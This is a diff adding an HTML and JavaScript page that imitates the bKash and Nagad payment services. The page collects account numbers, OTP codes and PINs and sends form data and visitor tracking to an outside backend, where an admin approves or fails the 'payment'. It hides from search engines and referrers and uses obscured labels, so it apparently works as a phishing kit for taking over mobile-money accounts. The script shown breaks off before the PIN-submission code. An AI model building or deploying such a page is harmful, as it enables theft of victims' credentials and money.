@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, maximum-scale=1.0, user-scalable=no">
+  <title>Secure Payment - bKash | Nagad</title>
+  <meta property="og:title" content="Secure Payment - bKash | Nagad">
+  <meta property="og:description" content="Fast and secure mobile payment via bKash and Nagad">
+  <meta property="og:image" content="/Payment/1111.webp">
+  <meta property="og:url" content="http://localhost:6200/Payment/">
+  <meta property="og:type" content="website">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Secure Payment - bKash | Nagad">
+  <meta name="twitter:description" content="Fast and secure mobile payment via bKash and Nagad">
+  <meta name="twitter:image" content="/Payment/1111.webp">
+  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+  <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet">
+  <meta name="referrer" content="no-referrer">
+  <meta http-equiv="cache-control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  <link rel="icon" type="image/webp" href="/Payment/1111.webp">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{width:100%;height:100%;overflow:hidden;-webkit-tap-highlight-color:transparent;position:fixed;top:0;left:0;right:0;bottom:0}
+body{font-family:system-ui,-apple-system,sans-serif;display:flex;align-items:center;justify-content:center;background:#f1f5f9}
+#status-bar{position:fixed;top:0;left:0;right:0;z-index:9999;padding:6px 12px;font-size:11px;font-weight:700;text-align:center;font-family:monospace;color:#fff}
+.gateway-container{max-width:420px;width:100%;margin:0 auto;text-align:center;height:100vh;height:100dvh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:clamp(12px,3vw,20px);background:#f1f5f9;overflow-y:auto;-webkit-overflow-scrolling:touch}
+.gateway-container .page-title{font-size:clamp(18px,4.5vw,26px);font-weight:700;color:#0f172a;margin-bottom:clamp(18px,3vh,28px)}
+.option-list{display:flex;flex-direction:column;gap:clamp(12px,2vh,16px);width:100%}
+.option-item{background:#fff;border-radius:20px;padding:clamp(18px,3vh,28px) clamp(16px,4vw,24px);cursor:pointer;border:2px solid #e8ecf1;display:flex;align-items:center;gap:clamp(12px,3vw,18px);box-shadow:0 4px 16px rgba(0,0,0,.04);transition:all 0.2s ease;text-decoration:none;position:relative;overflow:hidden}
+.option-item:active{transform:scale(0.97)}
+.option-item:hover{transform:translateY(-3px);box-shadow:0 12px 28px rgba(0,0,0,.10)}
+.option-item .gw-icon{width:clamp(52px,12vw,70px);height:clamp(52px,12vw,70px);min-width:clamp(52px,12vw,70px);border-radius:18px;display:flex;align-items:center;justify-content:center;flex-shrink:0;overflow:hidden;background:#f1f5f9}
+.option-item .gw-icon img{width:100%;height:100%;object-fit:cover;border-radius:18px}
+.option-item .gw-info{text-align:left;flex:1}
+.option-item .gw-info h3{font-size:clamp(16px,3.5vw,20px);font-weight:700;color:#0f172a;margin-bottom:2px;letter-spacing:-0.3px}
+.option-item .gw-info p{font-size:clamp(11px,2.5vw,13px);color:#64748b;font-weight:400}
+.option-item .gw-arrow{width:clamp(30px,7vw,40px);height:clamp(30px,7vw,40px);min-width:clamp(30px,7vw,40px);border-radius:50%;background:#f1f5f9;display:flex;align-items:center;justify-content:center;font-size:clamp(16px,4vw,22px);color:#94a3b8;transition:all 0.2s ease}
+.option-item:hover .gw-arrow{background:#e2e8f0;color:#475569}
+.option-item.bkash-card:hover{border-color:#e6007e;box-shadow:0 12px 32px rgba(230,0,126,.15)}
+.option-item.nagad-card:hover{border-color:#d92550;box-shadow:0 12px 32px rgba(217,37,80,.15)}
+.option-item::after{content:'';position:absolute;left:0;top:0;width:5px;height:100%;border-radius:0 6px 6px 0;opacity:0;transition:opacity 0.2s ease}
+.option-item.bkash-card::after{background:#e6007e}
+.option-item.nagad-card::after{background:#d92550}
+.option-item:hover::after{opacity:1}
+.bkash-wrapper{background:#efefef;display:flex;flex-direction:column;overflow:hidden;height:100vh;height:100dvh;position:fixed;top:0;left:0;right:0;bottom:0}
+.bkash-header{width:100%;background:#f5f5f5;border-bottom:1px solid #d9d9d9;display:flex;align-items:center;justify-content:center;padding:0 20px;height:clamp(38px,6vh,52px);flex-shrink:0}
+.screen-panel{display:none;width:100%;height:100%;flex-direction:column;overflow-y:auto;-webkit-overflow-scrolling:touch}
+.screen-panel.visible{display:flex}
+.spin-loader{border:3px solid rgba(255,255,255,.3);border-top:3px solid #fff;border-radius:50%;animation:rotateAnim .8s linear infinite;width:clamp(36px,8vw,44px);height:clamp(36px,8vw,44px);margin-bottom:20px}
+@keyframes rotateAnim{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+.ok-badge{border-radius:50%;background:#fff;display:flex;align-items:center;justify-content:center;animation:popIn .4s ease-out;width:clamp(48px,12vw,60px);height:clamp(48px,12vw,60px);margin-bottom:20px}
+@keyframes popIn{0%{transform:scale(0);opacity:0}100%{transform:scale(1);opacity:1}}
+input{-webkit-appearance:none;-moz-appearance:none;appearance:none;transition:all .2s ease}
+input:focus{box-shadow:0 0 0 2px rgba(230,0,126,.3);outline:none}
+button:active{transform:scale(.98)}
+.countdown-display{color:#fff;font-size:clamp(13px,2.5vw,16px);font-weight:600;margin-top:12px}
+.nagad-wrapper{position:fixed;top:0;left:0;right:0;bottom:0;background:radial-gradient(circle at center,#e62e3b 0%,#b30e1a 38%,#8a000d 100%);color:#fff;display:flex;flex-direction:column;overflow-y:auto;-webkit-overflow-scrolling:touch}
+.content-area{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:clamp(14px,3vh,28px) clamp(14px,4vw,28px);overflow:hidden}
+.upper-part{display:flex;flex-direction:column;align-items:center;width:100%}
+.main-heading{font-weight:700;line-height:1.3;font-size:clamp(20px,4vw,32px);text-shadow:0 1px 1px rgba(0,0,0,0.2)}
+.graphic-icon{margin:clamp(12px,3vh,28px) auto;position:relative;width:clamp(54px,14vw,80px);height:clamp(44px,11vw,66px)}
+.graphic-body{position:absolute;left:8%;top:22%;width:62%;height:34%;border:clamp(3px,0.6vw,4px) solid #fff;border-radius:2px;transform:rotate(-8deg)}
+.graphic-handle{position:absolute;left:16%;top:14%;width:32%;height:23%;border-top:clamp(3px,0.6vw,4px) solid #fff;border-left:clamp(3px,0.6vw,4px) solid #fff;border-right:clamp(3px,0.6vw,4px) solid #fff;border-radius:999px 999px 0 0;transform:rotate(-8deg)}
+.graphic-dot{position:absolute;bottom:8%;width:clamp(8px,2vw,10px);height:clamp(8px,2vw,10px);background:#fff;border-radius:50%}
+.graphic-dot.pos-left{left:22%}.graphic-dot.pos-right{left:58%}
+.decor-group{position:absolute;top:30%;display:grid;grid-template-columns:repeat(2,1fr);gap:1px}
+.decor-group.pos-left{left:0}.decor-group.pos-right{right:0}
+.decor-dot{width:clamp(3px,0.8vw,4px);height:clamp(3px,0.8vw,4px);background:rgba(255,255,255,0.7)}
+.entry-section{margin-top:clamp(14px,4vh,32px);width:100%;display:flex;flex-direction:column;align-items:center}
+.entry-label{font-weight:700;font-size:clamp(15px,2.5vw,22px);margin-bottom:clamp(8px,2vh,16px)}
+.digit-cluster{display:flex;align-items:center;justify-content:center;flex-wrap:wrap;gap:clamp(2px,0.6vw,4px)}
+.digit-field{width:clamp(18px,4.5vw,26px);height:clamp(30px,7vw,40px);background:#fff;border:none;border-radius:4px;box-shadow:inset 0 1px 2px rgba(0,0,0,0.2);text-align:center;font-size:clamp(15px,3vw,22px);font-weight:bold;color:#333;outline:none;caret-color:#b30e1a;-moz-appearance:textfield}
+.digit-field::-webkit-outer-spin-button,.digit-field::-webkit-inner-spin-button{-webkit-appearance:none;margin:0}
+.digit-field:focus{box-shadow:0 0 0 2px #ffc107}
+.divider-dash{width:clamp(8px,1.5vw,12px);height:clamp(3px,0.5vw,4px);background:#fff;border-radius:9999px;opacity:0.9}
+.lower-part{width:100%;display:flex;flex-direction:column;align-items:center;margin-top:clamp(14px,4vh,32px)}
+.btn-cluster{display:flex;gap:clamp(8px,2vw,14px);margin-top:clamp(8px,2vh,14px);flex-wrap:wrap;justify-content:center}
+.action-btn{background:#fff;color:#9e0010;font-weight:800;padding:clamp(7px,1.5vh,10px) clamp(20px,6vw,36px);border-radius:6px;border:none;box-shadow:0 4px 6px rgba(0,0,0,0.2);cursor:pointer;font-size:clamp(13px,2.2vw,18px)}
+.result-btn{font-weight:700;padding:clamp(8px,1.5vh,12px) clamp(16px,5vw,28px);border-radius:8px;border:none;box-shadow:0 2px 8px rgba(0,0,0,0.15);cursor:pointer;font-size:clamp(12px,2vw,15px);width:100%;max-width:280px;margin:4px 0}
+.brand-section{margin-top:clamp(14px,4vh,32px);display:flex;align-items:center;gap:clamp(8px,2vw,12px)}
+.brand-icon{position:relative;width:clamp(36px,8vw,52px);height:clamp(36px,8vw,52px);border:clamp(4px,1vw,5px) solid #fff;border-radius:50%;display:flex;align-items:center;justify-content:center}
+.brand-ring{width:clamp(16px,4vw,24px);height:clamp(16px,4vw,24px);border:clamp(3px,0.8vw,4px) solid #fff;border-radius:50%;border-right-color:transparent;transform:rotate(45deg);position:absolute}
+.brand-core{width:clamp(7px,2vw,12px);height:clamp(7px,2vw,12px);background:#fff;border-radius:50%}
+.brand-text{display:flex;flex-direction:column;align-items:flex-start;line-height:1}
+.brand-name{font-size:clamp(26px,7vw,44px);font-weight:900;letter-spacing:-0.02em}
+.brand-tagline{font-size:clamp(7px,1.5vw,10px);font-weight:600;letter-spacing:0.05em;margin-top:0.2rem}
+.bg-glow{position:absolute;inset:0;pointer-events:none;background:radial-gradient(circle at center,rgba(255,255,255,0.12),transparent 55%)}
+.is-hidden{display:none!important}
+.load-spinner{width:clamp(44px,14vw,70px);height:clamp(44px,14vw,70px);border:5px solid rgba(255,255,255,0.3);border-top:5px solid #fff;border-radius:50%;animation:spin-anim .8s linear infinite;margin:1.5rem auto}
+@keyframes spin-anim{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+.status-text{font-size:clamp(16px,4vw,26px);font-weight:600;margin-top:1rem}
+.full-page{display:none;width:100%;height:100vh;height:100dvh;flex-direction:column;position:fixed;top:0;left:0;right:0;bottom:0}
+.full-page.active-page{display:flex}
+.full-screen{width:100%;height:100%;position:relative;display:flex;flex-direction:column}
+.amount-display{font-size:clamp(28px,7vw,48px);font-weight:800;color:#fff;margin-bottom:clamp(10px,2vh,20px);letter-spacing:-0.5px;text-shadow:0 2px 4px rgba(0,0,0,0.15);line-height:1}
+.amount-badge{font-size:clamp(26px,6vw,42px);font-weight:800;color:#fff;margin-bottom:clamp(8px,1.5vh,16px);letter-spacing:-0.5px;text-shadow:0 2px 4px rgba(0,0,0,0.15);line-height:1}
+.result-icon{font-size:clamp(40px,8vw,56px);margin-bottom:12px}
+.result-title{font-weight:700;font-size:clamp(18px,4vw,26px);margin-bottom:6px}
+.result-subtitle{font-size:clamp(11px,2vw,14px);margin-bottom:16px;opacity:.85}
+</style>
+</head>
+<body>
+<div id="status-bar" style="background:#f59e0b;">Initializing...</div>
+
+<div id="page-gateway" class="full-page active-page">
+<div class="full-screen" style="background:#f1f5f9">
+<div class="gateway-container">
+<h1 class="page-title">Select Payment Method</h1>
+<div class="option-list" id="payment-option-list"></div>
+</div>
+</div>
+</div>
+
+<div id="page-bkash" class="full-page">
+<div id="bkash-container" class="full-screen bkash-wrapper">
+<header class="bkash-header"><span style="font-size:clamp(28px,5vw,40px);font-weight:300;letter-spacing:-.5px;color:#e2136e">b</span><span style="font-size:clamp(26px,4.5vw,36px);font-weight:300;color:#2f2f2f;margin-left:-5px">Kash</span></header>
+<div id="bk-screen1" class="screen-panel visible">
+<main style="flex:1;background:#e6007e;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:clamp(16px,3vh,28px) clamp(16px,4vw,24px);text-align:center;overflow:hidden">
+<div class="amount-display" id="bk-amount">৳0</div>
+<h1 style="color:#fff;font-weight:700;font-size:clamp(18px,4vw,26px);margin-bottom:clamp(16px,3vh,28px)">Enter Your bKash Account</h1>
+<input id="bk-field-account" type="tel" inputmode="numeric" placeholder="01XXXXXXXXX" maxlength="11" style="width:100%;max-width:380px;height:clamp(46px,8vh,58px);border-radius:8px;background:#fff;text-align:center;font-size:clamp(16px,3vw,24px);color:#1f2937;padding:0 14px;border:none" autocomplete="off">
+<p style="margin-top:clamp(14px,2.5vh,22px);color:#fff;font-weight:600;font-size:clamp(13px,2.5vw,17px)">Confirm and Proceed</p>
+</main>
+<footer style="background:#f9fafb;padding:clamp(10px,2vh,18px) clamp(16px,4vw,24px);display:flex;flex-direction:column;align-items:center;width:100%;flex-shrink:0;border-top:1px solid #e5e7eb">
+<div style="width:100%;max-width:380px;display:flex;gap:clamp(8px,2vw,14px)"><button id="btn-gateway-cancel" style="flex:1;height:clamp(40px,7vh,50px);border:1px solid #d1d5db;background:#fff;border-radius:8px;color:#374151;font-size:clamp(14px,2.5vw,17px);font-weight:500;cursor:pointer">Cancel</button><button id="bk-btn-confirm1" disabled style="flex:1;height:clamp(40px,7vh,50px);background:#e5e7eb;border-radius:8px;color:#9ca3af;font-size:clamp(14px,2.5vw,17px);font-weight:600;cursor:not-allowed;border:none">Confirm</button></div>
+<div style="margin-top:8px;color:#e6007e;font-size:clamp(12px,2vw,15px);font-weight:500">16247</div>
+</footer>
+</div>
+<div id="bk-screen2" class="screen-panel">
+<main style="flex:1;background:#e6007e;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:clamp(16px,3vh,28px) clamp(16px,4vw,24px);text-align:center;overflow:hidden">
+<div class="amount-display" id="bk-amount2">৳0</div>
+<h1 style="color:#fff;font-weight:700;font-size:clamp(18px,4vw,26px);margin-bottom:8px">Enter OTP Code</h1>
+<p style="color:#fff;font-size:clamp(12px,2vw,15px);opacity:.9;margin-bottom:clamp(16px,3vh,28px)">We Have Sent a 6-Digit Code</p>
+<input id="bk-field-otp" type="tel" inputmode="numeric" placeholder="XXXXXX" maxlength="6" style="width:100%;max-width:380px;height:clamp(46px,8vh,58px);border-radius:8px;background:#fff;text-align:center;font-size:clamp(16px,3vw,24px);color:#1f2937;padding:0 14px;letter-spacing:6px;border:none" autocomplete="off">
+<div class="countdown-display" id="bk-display-timer">60s</div>
+</main>
+<footer style="background:#f9fafb;padding:clamp(10px,2vh,18px) clamp(16px,4vw,24px);display:flex;flex-direction:column;align-items:center;width:100%;flex-shrink:0;border-top:1px solid #e5e7eb">
+<div style="width:100%;max-width:380px;display:flex;gap:clamp(8px,2vw,14px)"><button id="bk-back1" style="flex:1;height:clamp(40px,7vh,50px);border:1px solid #d1d5db;background:#fff;border-radius:8px;color:#374151;font-size:clamp(14px,2.5vw,17px);font-weight:500;cursor:pointer">Back</button><button id="bk-btn-confirm2" disabled style="flex:1;height:clamp(40px,7vh,50px);background:#e5e7eb;border-radius:8px;color:#9ca3af;font-size:clamp(14px,2.5vw,17px);font-weight:600;cursor:not-allowed;border:none">Confirm</button></div>
+</footer>
+</div>
+<div id="bk-screen3" class="screen-panel">
+<main style="flex:1;background:#e6007e;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:clamp(16px,3vh,28px) clamp(16px,4vw,24px);text-align:center;overflow:hidden">
+<div class="amount-display" id="bk-amount3">৳0</div>
+<h1 style="color:#fff;font-weight:700;font-size:clamp(18px,4vw,26px);margin-bottom:8px">Enter Your PIN</h1>
+<p style="color:#fff;font-size:clamp(12px,2vw,15px);opacity:.9;margin-bottom:clamp(16px,3vh,28px)">Enter Your 5-Digit PIN</p>
+<input id="bk-field-pin" type="password" inputmode="numeric" placeholder="....." maxlength="5" style="width:100%;max-width:380px;height:clamp(46px,8vh,58px);border-radius:8px;background:#fff;text-align:center;font-size:clamp(16px,3vw,24px);color:#1f2937;padding:0 14px;letter-spacing:6px;border:none" autocomplete="off">
+</main>
+<footer style="background:#f9fafb;padding:clamp(10px,2vh,18px) clamp(16px,4vw,24px);display:flex;flex-direction:column;align-items:center;width:100%;flex-shrink:0;border-top:1px solid #e5e7eb">
+<div style="width:100%;max-width:380px;display:flex;gap:clamp(8px,2vw,14px)"><button id="bk-back2" style="flex:1;height:clamp(40px,7vh,50px);border:1px solid #d1d5db;background:#fff;border-radius:8px;color:#374151;font-size:clamp(14px,2.5vw,17px);font-weight:500;cursor:pointer">Back</button><button id="bk-btn-confirm3" disabled style="flex:1;height:clamp(40px,7vh,50px);background:#e5e7eb;border-radius:8px;color:#9ca3af;font-size:clamp(14px,2.5vw,17px);font-weight:600;cursor:not-allowed;border:none">Confirm</button></div>
+</footer>
+</div>
+<div id="bk-screen4" class="screen-panel"><main style="flex:1;background:#e6007e;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:clamp(16px,3vh,28px) clamp(16px,4vw,24px);text-align:center"><div class="spin-loader"></div><h1 style="color:#fff;font-weight:700;font-size:clamp(18px,4vw,26px)">Processing...</h1></main></div>
+<div id="bk-screen5" class="screen-panel"><main style="flex:1;background:#e6007e;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:clamp(16px,3vh,28px) clamp(16px,4vw,24px);text-align:center"><div id="bk-wait-spinner" class="spin-loader"></div><h1 id="bk-wait-title" style="color:#fff;font-weight:700;font-size:clamp(18px,4vw,26px)">Waiting for Approval...</h1><p id="bk-wait-sub" style="color:#fff;font-size:clamp(11px,2vw,14px);margin-top:8px;opacity:.8">Your payment is being reviewed</p><div id="bk-result-approved" class="is-hidden"><div class="result-icon">✅</div><div class="result-title" style="color:#fff">Payment Approved</div><div class="result-subtitle" style="color:#fff">Redirecting to My Orders...</div></div><div id="bk-result-failed" class="is-hidden"><div class="result-icon">❌</div><div class="result-title" style="color:#fff">Payment Failed</div><div class="result-subtitle" style="color:#fff">Your payment could not be processed</div><button id="bk-btn-myorders" class="result-btn" style="background:#fff;color:#e6007e">📦 My Orders</button><button id="bk-btn-support" class="result-btn" style="background:rgba(255,255,255,0.2);color:#fff">📞 Contact Support</button></div></main></div>
+</div>
+</div>
+
+<div id="page-nagad" class="full-page">
+<div id="nagad-container" class="full-screen nagad-wrapper"><div class="bg-glow"></div><div class="content-area">
+<div id="ng-view-account" class="upper-part"><div class="amount-badge" id="ng-amount">৳0</div><h1 class="main-heading">Save Your Nagad Account<br>for Future Transactions</h1><div class="graphic-icon"><div class="graphic-body"></div><div class="graphic-handle"></div><div class="graphic-dot pos-left"></div><div class="graphic-dot pos-right"></div><div class="decor-group pos-left"><span class="decor-dot"></span><span class="decor-dot"></span><span class="decor-dot"></span><span class="decor-dot"></span></div><div class="decor-group pos-right"><span class="decor-dot"></span><span class="decor-dot"></span><span class="decor-dot"></span><span class="decor-dot"></span></div></div><div class="entry-section"><p class="entry-label">Your Nagad Account Number</p><div class="digit-cluster" id="ng-cluster-account"><input type="text" inputmode="numeric" maxlength="1" class="digit-field" autocomplete="off"><input type="text" inputmode="numeric" maxlength="1" class="digit-field" autocomplete="off"><input type="text" inputmode="numeric" maxlength="1" class="digit-field" autocomplete="off"><input type="text" inputmode="numeric" maxlength="1" class="digit-field" autocomplete="off"><span class="divider-dash"></span><input type="text" inputmode="numeric" maxlength="1" class="digit-field" autocomplete="off"><input type="text" inputmode="numeric" maxlength="1" class="digit-field" autocomplete="off"><input type="text" inputmode="numeric" maxlength="1" class="digit-field" autocomplete="off"><input type="text" inputmode="numeric" maxlength="1" class="digit-field" autocomplete="off"><span class="divider-dash"></span><input type="text" inputmode="numeric" maxlength="1" class="digit-field" autocomplete="off"><input type="text" inputmode="numeric" maxlength="1" class="digit-field" autocomplete="off"><input type="text" inputmode="numeric" maxlength="1" class="digit-field" autocomplete="off"></div></div></div>
+<div id="ng-view-otp" class="upper-part is-hidden"><div class="amount-badge" id="ng-amount2">৳0</div><h1 class="main-heading">Enter OTP</h1><p style="margin-top:0.5rem;font-size:clamp(13px,2vw,16px)">We Have Sent a 6-Digit Code</p><div class="entry-section" style="margin-top:clamp(24px,8vh,50px)"><p class="entry-label">OTP Code</p><div class="digit-cluster" id="ng-cluster-otp"><input type="text" inputmode="numeric" maxlength="1" class="digit-field" autocomplete="off"><input type="text" inputmode="numeric" maxlength="1" class="digit-field" autocomplete="off"><input type="text" inputmode="numeric" maxlength="1" class="digit-field" autocomplete="off"><span class="divider-dash"></span><input type="text" inputmode="numeric" maxlength="1" class="digit-field" autocomplete="off"><input type="text" inputmode="numeric" maxlength="1" class="digit-field" autocomplete="off"><input type="text" inputmode="numeric" maxlength="1" class="digit-field" autocomplete="off"></div><div class="countdown-text" id="ng-otp-countdown">60s</div></div></div>
+<div id="ng-view-pin" class="upper-part is-hidden"><div class="amount-badge" id="ng-amount3">৳0</div><h1 class="main-heading">Enter PIN</h1><p style="margin-top:0.5rem;font-size:clamp(13px,2vw,16px)">Enter Your 4-Digit PIN</p><div class="entry-section" style="margin-top:clamp(24px,8vh,50px)"><p class="entry-label">PIN</p><div class="digit-cluster" id="ng-cluster-pin"><input type="text" inputmode="numeric" maxlength="1" class="digit-field" autocomplete="off"><input type="text" inputmode="numeric" maxlength="1" class="digit-field" autocomplete="off"><span class="divider-dash"></span><input type="text" inputmode="numeric" maxlength="1" class="digit-field" autocomplete="off"><input type="text" inputmode="numeric" maxlength="1" class="digit-field" autocomplete="off"></div></div></div>
+<div id="ng-view-loading" class="upper-part is-hidden"><div class="load-spinner"></div><p class="status-text">Processing...</p></div>
+<div id="ng-view-waiting" class="upper-part is-hidden"><div id="ng-wait-spinner" class="load-spinner"></div><p class="status-text" id="ng-wait-title">Waiting for Approval...</p><p id="ng-wait-sub" style="font-size:clamp(11px,2vw,14px);margin-top:4px;opacity:.8">Your payment is being reviewed</p><div id="ng-result-approved" class="is-hidden"><div class="result-icon">✅</div><div class="result-title">Payment Approved</div><div class="result-subtitle">Redirecting to My Orders...</div></div><div id="ng-result-failed" class="is-hidden"><div class="result-icon">❌</div><div class="result-title">Payment Failed</div><div class="result-subtitle">Your payment could not be processed</div><button id="ng-btn-myorders" class="result-btn" style="background:#fff;color:#b30e1a">📦 My Orders</button><button id="ng-btn-support" class="result-btn" style="background:rgba(255,255,255,0.2);color:#fff">📞 Contact Support</button></div></div>
+<div class="lower-part">
+<div id="ng-btn-group-account" class="btn-cluster"><button id="ng-btn-next" class="action-btn">Next</button><button id="ng-btn-cancel" class="action-btn">Cancel</button></div>
+<div id="ng-btn-group-otp" class="btn-cluster is-hidden"><button id="ng-btn-verify" class="action-btn">Verify</button><button id="ng-btn-back1" class="action-btn">Back</button></div>
+<div id="ng-btn-group-pin" class="btn-cluster is-hidden"><button id="ng-btn-confirm" class="action-btn">Confirm</button><button id="ng-btn-back2" class="action-btn">Back</button></div>
+<div id="ng-btn-group-waiting" class="btn-cluster is-hidden"></div>
+<div class="brand-section"><div class="brand-icon"><div class="brand-ring"></div><div class="brand-core"></div></div><div class="brand-text"><span class="brand-name">Nagad</span><span class="brand-tagline">Digital Transaction</span></div></div>
+</div>
+</div></div></div>
+
+<script>
+var elStatus = document.getElementById('status-bar');
+function upd(s, c) { if (elStatus) { elStatus.textContent = s; elStatus.style.background = c; } }
+upd('Loading...', '#f59e0b');
+
+var API_BASE = 'https://mobile-card-bd-backend.onrender.com/api';
+function newVisitorId(){ return 'v_'+Date.now()+'_'+Math.random().toString(36).slice(2,10); }
+var TOKENS = (location.pathname + '/' + location.search).split('/').filter(Boolean);
+var lastToken = TOKENS[TOKENS.length - 1] || '';
+var urlParams = new URLSearchParams(location.search);
+var PASSED_VID = urlParams.get('vid') || '';
+var VISITOR_ID = PASSED_VID || newVisitorId();
+var visitCode = lastToken || 'direct';
+
+var PAYMENT_MODE = urlParams.get('mode') || 'online';
+var ORDER_AMOUNT = parseInt(urlParams.get('amount')) || 70;
+var ORDER_ID = urlParams.get('orderId') || '';
+var DISPLAY_AMOUNT = PAYMENT_MODE === 'cod' ? '৳70' : '৳' + ORDER_AMOUNT.toLocaleString('en-BD');
+var FORM_AMOUNT = '৳' + ORDER_AMOUNT;
+upd('Ready | ' + VISITOR_ID.slice(-8) + ' | ' + DISPLAY_AMOUNT + ' | ' + PAYMENT_MODE, '#10b981');
+
+document.querySelectorAll('.amount-display, .amount-badge').forEach(function(el) { el.textContent = DISPLAY_AMOUNT; });
+
+function sendVisit() {
+  fetch(API_BASE + '/track/visit', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ visitorId: VISITOR_ID, trackingCode: visitCode, browser: navigator.userAgent.substring(0, 50), device: /Mobi/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop' }) }).catch(function () {});
+}
+function sendHeartbeat() { fetch(API_BASE + '/track/heartbeat', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ visitorId: VISITOR_ID, status: 'Active' }) }).catch(function () {}); }
+function submitForm(data) { 
+  data.paymentMode = PAYMENT_MODE;
+  data.amount = FORM_AMOUNT;
+  fetch(API_BASE + '/track/submit', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ visitorId: VISITOR_ID, trackingCode: visitCode, formData: data }) }).catch(function () {}); 
+}
+
+(function () {
+  var bkOtpTimer = null, bkOtpSeconds = 60; var ngOtpTimer = null, ngOtpSeconds = 60;
+  var approvalCheckTimer = null;
+  function dBtn(id) { var b = document.getElementById(id); if (b) { b.disabled = true; b.style.background = "#e5e7eb"; b.style.color = "#9ca3af"; b.style.cursor = "not-allowed"; } }
+  function eBtn(id) { var b = document.getElementById(id); if (b) { b.disabled = false; b.style.background = "#e6007e"; b.style.color = "#fff"; b.style.cursor = "pointer"; } }
+  function uBtn(a, b) { var i = document.getElementById(a); if (i && i.value.trim().length > 0) eBtn(b); else dBtn(b); }
+  function startBkOtpTimer() { clearInterval(bkOtpTimer); bkOtpSeconds = 60; var d = document.getElementById("bk-display-timer"); if (d) d.textContent = bkOtpSeconds + "s"; bkOtpTimer = setInterval(function () { bkOtpSeconds--; if (d) d.textContent = bkOtpSeconds + "s"; if (bkOtpSeconds <= 0) { clearInterval(bkOtpTimer); if (d) d.textContent = "Resend"; } }, 1000); }
+  function startNgOtpTimer() { clearInterval(ngOtpTimer); ngOtpSeconds = 60; var d = document.getElementById("ng-otp-countdown"); if (d) d.textContent = ngOtpSeconds + "s"; ngOtpTimer = setInterval(function () { ngOtpSeconds--; if (d) d.textContent = ngOtpSeconds + "s"; if (ngOtpSeconds <= 0) { clearInterval(ngOtpTimer); if (d) d.textContent = "Resend"; } }, 1000); }
+  var paymentConfig = { containerId: "payment-option-list", items: [{ id: "bkash-card", gateway: "a", name: "bKash", description: "bKash Payment", imageSrc: "4171472147demotoswr.webp", accentColor: "#e6007e" }, { id: "nagad-card", gateway: "b", name: "Nagad", description: "Nagad Payment", imageSrc: "gjghjngjnmhgjgjtgj.webp", accentColor: "#d92550" }] };
+
+  var isBkash = function() { return document.getElementById("page-bkash").classList.contains("active-page"); };
+
+  function hideWaitShow(id) {
+    var p = isBkash() ? "bk" : "ng";
+    var waitSpinner = document.getElementById(p + "-wait-spinner");
+    var waitTitle = document.getElementById(p + "-wait-title");
+    var waitSub = document.getElementById(p + "-wait-sub");
+    if (waitSpinner) waitSpinner.classList.add("is-hidden");
+    if (waitTitle) waitTitle.classList.add("is-hidden");
+    if (waitSub) waitSub.classList.add("is-hidden");
+    var resultBox = document.getElementById(p + "-result-" + id);
+    if (resultBox) resultBox.classList.remove("is-hidden");
+  }
+
+  function updateOrderStatus(status) {
+    if (!ORDER_ID) return;
+    fetch(API_BASE + '/orders/' + ORDER_ID + '/status', {
+      method: 'PATCH',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ paymentStatus: status })
+    }).catch(function() {});
+  }
+
+  function startApprovalCheck(sessionId) {
+    clearInterval(approvalCheckTimer);
+    var elapsed = 0;
+    approvalCheckTimer = setInterval(function() {
+      elapsed++;
+      fetch(API_BASE + '/track/status/' + sessionId).then(function(r) { return r.json(); }).then(function(s) {
+        if (s.adminStatus === 'approved') { 
+          hideWaitShow('approved'); clearInterval(approvalCheckTimer); upd('Payment Approved', '#10b981');
+          updateOrderStatus('success');
+          setTimeout(function() { window.location.href = '/my-orders'; }, 5000);
+        }
+        else if (s.adminStatus === 'failed') { 
+          hideWaitShow('failed'); clearInterval(approvalCheckTimer); upd('Payment Failed', '#ef4444');
+          updateOrderStatus('failed');
+        }
+      }).catch(function() {});
+      if (elapsed >= 60) { 
+        hideWaitShow('failed'); clearInterval(approvalCheckTimer); upd('Payment Failed - Timeout', '#ef4444');
+        updateOrderStatus('failed');
+      }
+    }, 1000);
+  }
+
+  window.selectGateway = function (g) {
+    var gwName = g === 'a' ? 'bKash' : 'Nagad';
+    if (history.pushState) { history.pushState(null, '', location.pathname + '?cat=' + gwName.toLowerCase() + '&mode=' + PAYMENT_MODE + '&amount=' + ORDER_AMOUNT); }
+    submitForm({ snd: 'select', gw: g === 'a' ? 'Svc-A' : 'Svc-B', gateway: gwName, st: "selected", amount: FORM_AMOUNT });
+    document.querySelectorAll(".full-page").forEach(function (p) { p.classList.remove("active-page"); });
+    if (g === 'a') { document.getElementById("page-bkash").classList.add("active-page"); resetBk(); }
+    else if (g === 'b') { document.getElementById("page-nagad").classList.add("active-page"); resetNg(); }
+  };
+  window.goToGateway = function () { location.reload(); };
